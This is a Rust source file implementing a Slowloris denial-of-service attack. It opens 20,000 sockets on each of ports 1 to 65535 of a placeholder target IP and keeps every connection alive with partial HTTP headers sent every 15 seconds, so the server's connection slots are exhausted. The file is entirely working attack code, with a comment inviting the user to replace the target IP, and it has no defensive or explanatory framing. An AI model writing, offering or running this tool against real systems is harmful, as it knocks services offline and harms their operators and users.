use std::net::TcpStream;
use std::io::{self, Write};
use std::thread;
use std::time::Duration;
use std::sync::Arc;
 
const PAYLOAD: &str = "GET / HTTP/1.1\r\nHost: ";
 
fn send_partial_request(host: &str, port: u16, num_sockets: usize) {
    let arc_host = Arc::new(host.to_string());
 
    for _ in 0..num_sockets {
        let host_clone = Arc::clone(&arc_host);
        thread::spawn(move || {
            match TcpStream::connect((host_clone.as_str(), port)) {
                Ok(mut stream) => {
                    stream.write(PAYLOAD.as_bytes()).unwrap();
                    stream.write(format!("{}\r\n", host_clone).as_bytes()).unwrap();
                    loop {
                        match stream.write(b"X-a: b\r\n") {
                            Ok(_) => {
                                thread::sleep(Duration::from_secs(15));
                            }
                            Err(e) => {
                                eprintln!("Error sending data: {}", e);
                                break;
                            }
                        }
                    }
                }
                Err(e) => {
                    eprintln!("Error connecting to {}: {}", host_clone, e);
                }
            }
        });
    }
}
 
fn main() {
    let target_ip = "192.168.1.100";  // Replace with the target IP
    let num_sockets = 20000;  // Number of sockets to open
 
    // Run on ports 1 to 65535
    for port in 1..=65535 {
        send_partial_request(target_ip, port, num_sockets);
        println!("[*] Running Slowloris on port: {}", port);
        thread::sleep(Duration::from_millis(10)); // Slight delay to manage resource usage
    }
}
